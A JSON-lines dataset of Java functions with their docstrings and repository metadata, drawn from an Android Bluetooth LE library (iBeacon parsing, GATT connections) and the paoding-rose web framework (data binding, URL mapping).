{"docstring": "/**\n * As list.\n *\n * @param <C>         the generic type\n * @param sparseArray the sparse array\n * @return the collection\n */\n", "func_signal": "public static <C> Collection<C> asList(final SparseArray<C> sparseArray)", "code": "{\n    if (sparseArray == null) return null;\n\n    final Collection<C> arrayList = new ArrayList<>(sparseArray.size());\n    for (int i = 0; i < sparseArray.size(); i++) {\n        arrayList.add(sparseArray.valueAt(i));\n    }\n\n    return arrayList;\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\adrecord\\AdRecordStore.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Initializes a reference to the local Bluetooth adapter.\n *\n * @return Return true if the initialization is successful.\n */\n", "func_signal": "public boolean initialize()", "code": "{\n    // For API level 18 and above, get a reference to BluetoothAdapter through\n    // BluetoothManager.\n    if (mBluetoothManager == null) {\n        mBluetoothManager = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);\n        if (mBluetoothManager == null) {\n            Log.e(TAG, \"Unable to initialize BluetoothManager.\");\n            return false;\n        }\n    }\n\n    mBluetoothAdapter = mBluetoothManager.getAdapter();\n    if (mBluetoothAdapter == null) {\n        Log.e(TAG, \"Unable to obtain a BluetoothAdapter.\");\n        return false;\n    }\n\n    return true;\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Ascertains whether a {@link uk.co.alt236.bluetoothlelib.device.BluetoothLeDevice} is an iBeacon;\n *\n * @param device a {@link uk.co.alt236.bluetoothlelib.device.BluetoothLeDevice} device.\n * @return the {@link BeaconType}\n */\n", "func_signal": "public static BeaconType getBeaconType(final BluetoothLeDevice device)", "code": "{\n    final int key = AdRecord.TYPE_MANUFACTURER_SPECIFIC_DATA;\n    return getBeaconType(device.getAdRecordStore().getRecordDataAsString(key).getBytes());\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\BeaconUtils.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Connects to the GATT server hosted on the Bluetooth LE device.\n *\n * @param address The device address of the destination device.\n * @return Return true if the connection is initiated successfully. The connection result\n * is reported asynchronously through the\n * {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n * callback.\n */\n", "func_signal": "public boolean connect(final String address)", "code": "{\n\n    final boolean retVal;\n    if (mBluetoothAdapter == null || address == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized or unspecified address.\");\n        retVal = false;\n\n        // Previously connected device.  Try to reconnect.\n    } else if (mBluetoothDeviceAddress != null\n            && address.equals(mBluetoothDeviceAddress)\n            && mBluetoothGatt != null) {\n\n        Log.d(TAG, \"Trying to use an existing mBluetoothGatt for connection.\");\n        if (mBluetoothGatt.connect()) {\n            Log.d(TAG, \"Connection attempt OK.\");\n            setConnectionState(State.CONNECTING, true);\n            retVal = true;\n        } else {\n            Log.w(TAG, \"Connection attempt failed.\");\n            setConnectionState(State.DISCONNECTED, true);\n            retVal = false;\n        }\n    } else {\n\n        final BluetoothDevice device = mBluetoothAdapter.getRemoteDevice(address);\n        if (device == null) {\n            Log.w(TAG, \"Device not found.  Unable to connect.\");\n            retVal = false;\n        } else {\n            // We want to directly connect to the device, so we are setting the autoConnect\n            // parameter to false.\n\n            Log.d(TAG, \"Trying to create a new connection.\");\n            mBluetoothGatt = device.connectGatt(this, false, mGattCallback);\n            mBluetoothDeviceAddress = address;\n            setConnectionState(State.CONNECTING, true);\n            retVal = true;\n        }\n    }\n\n    return retVal;\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/*\n * Read out all the AD structures from the raw scan record\n */\n", "func_signal": "public static List<AdRecord> parseScanRecordAsList(final byte[] scanRecord)", "code": "{\n    final List<AdRecord> records = new ArrayList<>();\n\n    int index = 0;\n    while (index < scanRecord.length) {\n        final int length = scanRecord[index++];\n        //Done once we run out of records\n        if (length == 0) break;\n\n        final int type = ByteUtils.getIntFromByte(scanRecord[index]);\n\n        //Done if our record isn't a valid type\n        if (type == 0) break;\n\n        final byte[] data = Arrays.copyOfRange(scanRecord, index + 1, index + length);\n\n        records.add(new AdRecord(length, type, data));\n\n        //Advance\n        index += length;\n    }\n\n    return Collections.unmodifiableList(records);\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\util\\AdRecordUtils.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Gets the record data as string.\n *\n * @param record the record\n * @return the record data as string\n */\n", "func_signal": "public String getRecordDataAsString(final int record)", "code": "{\n    return AdRecordUtils.getRecordDataAsString(\n            mAdRecords.get(record));\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\adrecord\\AdRecordStore.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/* (non-Javadoc)\n * @see android.os.Parcelable#writeToParcel(android.os.Parcel, int)\n */\n", "func_signal": "@Override\npublic void writeToParcel(final Parcel parcel, final int arg1)", "code": "{\n    final Bundle b = new Bundle();\n    b.putString(\"local_name_complete\", mLocalNameComplete);\n    b.putString(\"local_name_short\", mLocalNameShort);\n    b.putSparseParcelableArray(\"records_array\", mAdRecords);\n\n    parcel.writeBundle(b);\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\adrecord\\AdRecordStore.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Instantiates a new iBeacon manufacturer data object.\n *\n * @param manufacturerData the {@link AdRecord#TYPE_MANUFACTURER_SPECIFIC_DATA} data array\n * @throws IllegalArgumentException if the data is not from an iBeacon.\n */\n", "func_signal": "public IBeaconManufacturerData(final byte[] manufacturerData)", "code": "{\n    super(BeaconType.IBEACON, manufacturerData);\n\n    final byte[] intArray = Arrays.copyOfRange(manufacturerData, 0, 2);\n    ByteUtils.invertArray(intArray);\n\n    mCompanyIdentidier = ByteUtils.getIntFrom2ByteArray(intArray);\n    mIBeaconAdvertisment = ByteUtils.getIntFrom2ByteArray(Arrays.copyOfRange(manufacturerData, 2, 4));\n    mUUID = IBeaconUtils.calculateUuidString(Arrays.copyOfRange(manufacturerData, 4, 20));\n    mMajor = ByteUtils.getIntFrom2ByteArray(Arrays.copyOfRange(manufacturerData, 20, 22));\n    mMinor = ByteUtils.getIntFrom2ByteArray(Arrays.copyOfRange(manufacturerData, 22, 24));\n    mCalibratedTxPower = manufacturerData[24];\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\ibeacon\\IBeaconManufacturerData.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * After using a given BLE device, the app must call this method to ensure resources are\n * released properly.\n */\n", "func_signal": "public void close()", "code": "{\n    if (mBluetoothGatt == null) {\n        return;\n    }\n    mBluetoothGatt.close();\n    mBluetoothGatt = null;\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Instantiates a new iBeacon device.\n *\n * @param device     the device\n * @param rssi       the RSSI value of the RSSI measurement\n * @param scanRecord the scan record\n * @param timestamp  the timestamp of the RSSI measurement\n * @throws IllegalArgumentException if the passed device is not an iBeacon\n */\n", "func_signal": "public IBeaconDevice(final BluetoothDevice device, final int rssi, final byte[] scanRecord, final long timestamp)", "code": "{\n    super(device, rssi, scanRecord, timestamp);\n    mIBeaconData = new IBeaconManufacturerData(this);\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\ibeacon\\IBeaconDevice.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Instantiates a new Bluetooth LE device Ad Record Store.\n *\n * @param adRecords the ad records\n */\n", "func_signal": "public AdRecordStore(final SparseArray<AdRecord> adRecords)", "code": "{\n    mAdRecords = adRecords;\n\n    mLocalNameComplete = AdRecordUtils.getRecordDataAsString(\n            mAdRecords.get(AdRecord.TYPE_LOCAL_NAME_COMPLETE));\n\n    mLocalNameShort = AdRecordUtils.getRecordDataAsString(\n            mAdRecords.get(AdRecord.TYPE_LOCAL_NAME_SHORT));\n\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\adrecord\\AdRecordStore.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "// Demonstrates how to iterate through the supported GATT Services/Characteristics.\n// In this sample, we populate the data structure that is bound to the ExpandableListView\n// on the UI.\n", "func_signal": "private void displayGattServices(final List<BluetoothGattService> gattServices)", "code": "{\n    if (gattServices == null) return;\n    mExportString = mExporter.generateExportString(\n            mDevice.getName(),\n            mDevice.getAddress(),\n            gattServices);\n\n    final GattDataAdapterFactory.GattDataAdapter adapter = GattDataAdapterFactory.createAdapter(this, gattServices);\n    view.setListAdapter(adapter);\n    invalidateOptionsMenu();\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\ui\\control\\DeviceControlActivity.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Gets the estimated Accuracy of the reading in meters based on\n * a simple running average of the last {@link #MAX_RSSI_LOG_SIZE}\n * samples.\n *\n * @return the accuracy in meters\n */\n", "func_signal": "public double getAccuracy()", "code": "{\n    return IBeaconUtils.calculateAccuracy(\n            getCalibratedTxPower(),\n            getRunningAverageRssi());\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\ibeacon\\IBeaconDevice.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Ascertains whether a Manufacturer Data byte array belongs to a known Beacon type;\n *\n * @param manufacturerData a Bluetooth LE device's raw manufacturerData.\n * @return the {@link BeaconType}\n */\n", "func_signal": "public static BeaconType getBeaconType(final byte[] manufacturerData)", "code": "{\n    if (manufacturerData == null || manufacturerData.length == 0) {\n        return BeaconType.NOT_A_BEACON;\n    }\n\n    if(isIBeacon(manufacturerData)){\n        return BeaconType.IBEACON;\n    } else {\n        return BeaconType.NOT_A_BEACON;\n    }\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\BeaconUtils.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Calculates the accuracy of an RSSI reading.\n * <p/>\n * The code was taken from <a href=\"http://stackoverflow.com/questions/20416218/understanding-ibeacon-distancing\" /a>\n *\n * @param txPower the calibrated TX power of an iBeacon\n * @param rssi    the RSSI value of the iBeacon\n * @return the calculated Accuracy\n */\n", "func_signal": "public static double calculateAccuracy(final int txPower, final double rssi)", "code": "{\n    if (rssi == 0) {\n        return -1.0; // if we cannot determine accuracy, return -1.\n    }\n\n    final double ratio = rssi * 1.0 / txPower;\n    if (ratio < 1.0) {\n        return Math.pow(ratio, 10);\n    } else {\n        return (0.89976) * Math.pow(ratio, 7.7095) + 0.111;\n    }\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\ibeacon\\IBeaconUtils.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Request a read on a given {@code BluetoothGattCharacteristic}. The read result is reported\n * asynchronously through the {@code BluetoothGattCallback#onCharacteristicRead(android.bluetooth.BluetoothGatt, android.bluetooth.BluetoothGattCharacteristic, int)}\n * callback.\n *\n * @param characteristic The characteristic to read from.\n */\n", "func_signal": "public void readCharacteristic(final BluetoothGattCharacteristic characteristic)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.readCharacteristic(characteristic);\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Will try to convert a {@link BluetoothLeDevice} into an\n * iBeacon Device.\n *\n * @param device the device\n * @throws IllegalArgumentException if the passed device is not an iBeacon\n */\n", "func_signal": "public IBeaconDevice(final BluetoothLeDevice device)", "code": "{\n    super(device);\n    mIBeaconData = new IBeaconManufacturerData(this);\n}", "path": "library\\src\\main\\java\\uk\\co\\alt236\\bluetoothlelib\\device\\beacon\\ibeacon\\IBeaconDevice.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Disconnects an existing connection or cancel a pending connection. The disconnection result\n * is reported asynchronously through the\n * {@code BluetoothGattCallback#onConnectionStateChange(android.bluetooth.BluetoothGatt, int, int)}\n * callback.\n */\n", "func_signal": "public void disconnect()", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.disconnect();\n\n    // Reusing a Gatt after disconnecting can cause problems\n    mBluetoothGatt = null;\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Retrieves a list of supported GATT services on the connected device. This should be\n * invoked only after {@code BluetoothGatt#discoverServices()} completes successfully.\n *\n * @return A {@code List} of supported services.\n */\n", "func_signal": "public List<BluetoothGattService> getSupportedGattServices()", "code": "{\n    if (mBluetoothGatt == null) return null;\n\n    return mBluetoothGatt.getServices();\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Enables or disables notification on a give characteristic.\n *\n * @param characteristic Characteristic to act on.\n * @param enabled        If true, enable notification.  False otherwise.\n */\n", "func_signal": "public void setCharacteristicNotification(final BluetoothGattCharacteristic characteristic, final boolean enabled)", "code": "{\n    if (mBluetoothAdapter == null || mBluetoothGatt == null) {\n        Log.w(TAG, \"BluetoothAdapter not initialized\");\n        return;\n    }\n    mBluetoothGatt.setCharacteristicNotification(characteristic, enabled);\n}", "path": "sample_app\\src\\main\\java\\uk\\co\\alt236\\btlescan\\services\\BluetoothLeService.java", "repo_name": "alt236/Bluetooth-LE-Library---Android", "stars": 852, "license": "None", "language": "java", "size": 13981}
{"docstring": "/**\n * Bind the parameters of the given request to this binder's target,\n * also binding multipart files in case of a multipart request.\n * <p>\n * This call can create field errors, representing basic binding errors\n * like a required field (code \"required\"), or type mismatch between\n * value and bean property (code \"typeMismatch\").\n * <p>\n * Multipart files are bound via their parameter name, just like normal\n * HTTP parameters: i.e. \"uploadedFile\" to an \"uploadedFile\" bean\n * property, invoking a \"setUploadedFile\" setter method.\n * <p>\n * The type of the target property for a multipart file can be\n * MultipartFile, byte[], or String. The latter two receive the\n * contents of the uploaded file; all metadata like original file name,\n * content type, etc are lost in those cases.\n * \n * @param request request with parameters to bind (can be multipart)\n * @see org.springframework.web.multipart.MultipartHttpServletRequest\n * @see org.springframework.web.multipart.MultipartFile\n * @see #bindMultipartFiles\n * @see #bind(org.springframework.beans.PropertyValues)\n */\n", "func_signal": "public void bind(ServletRequest request)", "code": "{\n    MutablePropertyValues mpvs = new MutablePropertyValues(WebUtils.getParametersStartingWith(\n            request, prefix));\n    MultipartRequest multipartRequest = WebUtils.getNativeRequest(request, MultipartRequest.class);\n    if (multipartRequest != null) {\n        bindMultipart(multipartRequest.getMultiFileMap(), mpvs);\n    }\n    addBindValues(mpvs, request);\n    doBind(mpvs);\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\paramresolver\\ServletRequestDataBinder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u6784\u9020\u4e8c\u5143\u7684\u6761\u4ef6\u8bed\u53e5\u5355\u5143\u3002\n * \n * @param expr - \u6761\u4ef6\u8868\u8fbe\u5f0f\n * @param unitIfTrue - <code>true</code> \u7684\u8f93\u51fa\n * @param unitIfFalse - <code>false</code> \u7684\u8f93\u51fa\n */\n", "func_signal": "public ChoiceUnit(String expr, ExqlUnit unitIfTrue, ExqlUnit unitIfFalse)", "code": "{\n    this.expr = expr;\n    this.unitIfTrue = unitIfTrue;\n    this.unitIfFalse = unitIfFalse;\n}", "path": "paoding-rose-jade\\src\\main\\java\\net\\paoding\\rose\\jade\\statement\\expression\\impl\\ChoiceUnit.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u6784\u9020\u4e00\u5143\u7684\u6761\u4ef6\u8bed\u53e5\u5355\u5143\u3002\n * \n * @param expr - \u6761\u4ef6\u8868\u8fbe\u5f0f\n * @param unit - <code>true</code> \u7684\u8f93\u51fa\n */\n", "func_signal": "public ChoiceUnit(String expr, ExqlUnit unit)", "code": "{\n    this.expr = expr;\n    this.unitIfTrue = unit;\n    this.unitIfFalse = null;\n}", "path": "paoding-rose-jade\\src\\main\\java\\net\\paoding\\rose\\jade\\statement\\expression\\impl\\ChoiceUnit.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "// FIXME: \u5982\u679c\u4e00\u4e2amodule\u53ea\u6709rose.properties\u6587\u4ef6\u4e5f\u4f1a\u4ecemoduleInfoList\u4e2dremove\uff0c\u4ee5\u540e\u662f\u5426\u9700\u8981\u4fee\u6539\uff1f\n", "func_signal": "protected void afterScanning(Local local)", "code": "{\n    for (ModuleResource moduleResource : local.moduleResourceMap.values()) {\n        if (moduleResource.getContextResources().size() == 0\n                && moduleResource.getModuleClasses().size() == 0) {\n            local.moduleResourceList.remove(moduleResource);\n            if (logger.isInfoEnabled()) {\n                logger.info(\"remove empty module '\" + moduleResource.getMappingPath() + \"' \"\n                        + moduleResource.getModuleUrl());\n            }\n        }\n    }\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\scanner\\ModuleResourceProviderImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "// \u9488\u5bf9vm\uff0c\u901a\u8fc7afterCompletion\u6211\u4eec\u53ef\u4ee5\u505a\u5230\u81ea\u52a8\u5199pipe\n// \u5bf9\u4e8ejsp\uff0c\u5219\u8fd9\u4e2a\u4ee3\u7801\u4e0d\u4f1a\u751f\u6548(isStarted\u4f1a\u8fd4\u56detrue)\n", "func_signal": "@Override\npublic void afterCompletion(Invocation inv, Throwable ex) throws Exception", "code": "{\n    if (ex != null) {\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"close the pipe and returen because of exception previous.\");\n        }\n        return;\n    }\n    //\n    PipeImpl pipe = (PipeImpl) PortalUtils.getPipe(inv);\n    if (pipe == null) {\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"there's no pipe windows.\");\n        }\n        return;\n    }\n\n    if (inv != inv.getHeadInvocation()) {\n        return;\n    }\n    if (!pipe.isStarted()) {\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"writing \" + pipe + \"...\");\n        }\n\n        pipe.write(inv.getResponse().getWriter());\n\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"writing \" + pipe + \"... done\");\n        }\n    } else {\n        if (logger.isDebugEnabled()) {\n            logger.debug(pipe + \" has been started yet.\");\n        }\n    }\n\n}", "path": "paoding-rose-pipe\\src\\main\\java\\net\\paoding\\rose\\web\\portal\\impl\\PipeInterceptor.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * Treats errors as fatal.\n * <p>\n * Use this method only if it's an error if the input isn't valid. This\n * might be appropriate if all input is from dropdowns, for example.\n * \n * @throws ServletRequestBindingException subclass of ServletException\n *         on any binding problem\n */\n", "func_signal": "public void closeNoCatch() throws ServletRequestBindingException", "code": "{\n    if (getBindingResult().hasErrors()) {\n        throw new ServletRequestBindingException(\"Errors binding onto object '\"\n                + getBindingResult().getObjectName() + \"'\", new BindException(\n                getBindingResult()));\n    }\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\paramresolver\\ServletRequestDataBinder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * Create a new ServletRequestDataBinder instance.\n * \n * @param target the target object to bind onto (or <code>null</code>\n *        if the binder is just used to convert a plain parameter\n *        value)\n * @param objectName the name of the target object\n */\n", "func_signal": "public ServletRequestDataBinder(Object target, String objectName)", "code": "{\n    super(target, objectName);\n    prefix = objectName + '.';\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\paramresolver\\ServletRequestDataBinder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * Rose\u5bf9BeanFactory\u7684\u7279\u6b8a\u5904\u7406\uff0c\u5fc5\u8981\u65f6\u53ef\u4ee5\u8986\u76d6\u8fd9\u4e2a\u65b9\u6cd5\u53bb\u6389Rose\u7684\u7279\u6709\u7684\u5904\u7406\n * \n * @throws IOException\n */\n", "func_signal": "protected void prepareBeanFactoryByRose(ConfigurableListableBeanFactory beanFactory)\n        throws IOException", "code": "{\n    BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;\n    AnnotationConfigUtils.registerAnnotationConfigProcessors(registry);\n\n    String[] messageBaseNames = getMessageBaseNames();\n    if (messageBaseNames != null && messageBaseNames.length > 0) {\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"[roseWebApp/messages] starting registerMessageSourceIfNecessary\");\n        }\n        registerMessageSourceIfNecessary(registry, messageBaseNames);\n        if (logger.isDebugEnabled()) {\n            logger.debug(\"[roseWebApp/messages] finished registerMessageSourceIfNecessary\");\n        }\n    }\n}", "path": "paoding-rose-load\\src\\main\\java\\net\\paoding\\rose\\load\\context\\RoseWebAppContext.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * @param simpleName \u8d44\u6e90\u76f8\u5bf9\u4e8e\u4e0a\u7ea7\u7684\u8d44\u6e90\u7684\u540d\u79f0\n */\n", "func_signal": "public EngineGroupImpl()", "code": "{\n    LinkedEngine[][] engines = new LinkedEngine[ARRAY_SIZE][];\n    Arrays.fill(engines, emptyEngines);\n    this.engines = engines;\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\EngineGroupImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u6dfb\u52a0\u4e00\u4e2a {@link Engine} \uff1b\u5982\u679c\u6240\u7ed9\u7684 method \u662f {@link ReqMethod#ALL}\uff0c\u5219\u4f18\u5148\u7ea7\u6700\u4f4e\u3002\n * \n * @param method\n * @param engine\n */\n", "func_signal": "public void addEngine(ReqMethod method, LinkedEngine engine)", "code": "{\n    for (ReqMethod md : method.parse()) {\n        LinkedEngine[] methodEngines = engines[md.ordinal()];\n        if (methodEngines.length == 0) {\n            methodEngines = new LinkedEngine[] { engine };\n        } else {\n            methodEngines = Arrays.copyOf(methodEngines, methodEngines.length + 1);\n            methodEngines[methodEngines.length - 1] = engine;\n        }\n        engines[md.ordinal()] = methodEngines;\n        engineCount++;\n    }\n    clearCache();\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\EngineGroupImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u68c0\u67e5\u6574\u4e2a\u6811\u7684\u72b6\u51b5\uff0c\u5c3d\u53ef\u80fd\u62a5\u544a\u53ef\u80fd\u5b58\u5728\u7684\u95ee\u9898\n * \n * @param tree\n * @param parent\n * @param prefix\n */\n", "func_signal": "private void check(MappingNode tree, MappingNode parent, String prefix)", "code": "{\n    MappingNode child = parent.getLeftMostChild();\n    MappingNode sibling = null;\n    while (child != null) {\n        if (sibling != null) {\n            if (child.compareTo(sibling) == 0) {\n                logger.error(\"mapping conflicts: '\" + child.getMapping().getDefinition()\n                        + \"' conflicts with '\" + sibling.getMapping().getDefinition()\n                        + \"' in '\" + prefix + \"'; here is the mapping tree, \"\n                        + \"you can find the conflict in it:\\n\" + PrinteHelper.list(tree));\n                throw new IllegalArgumentException(\"mapping conflicts: '\"\n                        + child.getMapping().getDefinition() + \"' conflicts with '\"\n                        + sibling.getMapping().getDefinition() + \"' in '\" + prefix + \"'\");\n            }\n        }\n        check(tree, child, prefix + child.getMapping().getDefinition());\n        sibling = child;\n        child = child.getSibling();\n    }\n\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\TreeBuilder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u8fd4\u56de\u5904\u7406\u8fd9\u4e2a\u8d44\u6e90\u7684\u5904\u7406\u903b\u8f91\uff0c\u5982\u679c\u8be5\u8d44\u6e90\u4e0d\u652f\u6301\u8be5\u64cd\u4f5c\u65b9\u6cd5\u8fd4\u56de\u957f\u5ea6\u4e3a0\u7684\u6570\u7ec4\u3002\n * \n * @param method \u9664 {@link ReqMethod#ALL} \u5916\u7684\u5176\u4ed6 {@link ReqMethod}\n *        \u5b9e\u4f8b\uff1b\u53ef\u4ee5\u4e3anull\n * @return\n */\n", "func_signal": "@Override\npublic LinkedEngine[] getEngines(ReqMethod method)", "code": "{\n    if (method == null) {\n        return emptyEngines;\n    }\n    if (method == ReqMethod.ALL) {\n        throw new IllegalArgumentException(\"method\");\n    }\n    return engines[method.ordinal()];\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\EngineGroupImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * Return the internal BindingResult held by this DataBinder, as\n * AbstractPropertyBindingResult.\n */\n", "func_signal": "@Override\nprotected AbstractPropertyBindingResult getInternalBindingResult()", "code": "{\n    AbstractPropertyBindingResult bindingResult = super.getInternalBindingResult();\n\n    // by rose\n    PropertyEditorRegistry registry = bindingResult.getPropertyEditorRegistry();\n    registry.registerCustomEditor(Date.class, new DateEditor(Date.class));\n    registry.registerCustomEditor(java.sql.Date.class, new DateEditor(java.sql.Date.class));\n    registry.registerCustomEditor(java.sql.Time.class, new DateEditor(java.sql.Time.class));\n    registry.registerCustomEditor(java.sql.Timestamp.class, new DateEditor(\n            java.sql.Timestamp.class));\n    return bindingResult;\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\paramresolver\\ServletRequestDataBinder.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u9500\u6bc1\u8be5\u8d44\u6e90\n */\n", "func_signal": "public void destroy()", "code": "{\n    if (!destroyed) {\n        return;\n    }\n    destroyed = true;\n    for (Engine[] methodEngines : engines) {\n        for (Engine engine : methodEngines) {\n            try {\n                engine.destroy();\n            } catch (Throwable e) {\n                logger.error(\"\", e);\n            }\n        }\n    }\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\EngineGroupImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
{"docstring": "/**\n * \u521b\u5efa\u65b0\u7684\u5339\u914d\u7ed3\u679c\u5bf9\u8c61\n * \n * @param value \u5339\u914d\u7ed3\u679c\u5b57\u7b26\u4e32\n */\n", "func_signal": "public MatchResultImpl(MappingNode mappingNode, String value)", "code": "{\n    this.mappingNode = mappingNode;\n    this.value = value;\n}", "path": "paoding-rose-web\\src\\main\\java\\net\\paoding\\rose\\web\\impl\\mapping\\MatchResultImpl.java", "repo_name": "paoding-code/paoding-rose", "stars": 599, "license": "apache-2.0", "language": "java", "size": 1373}
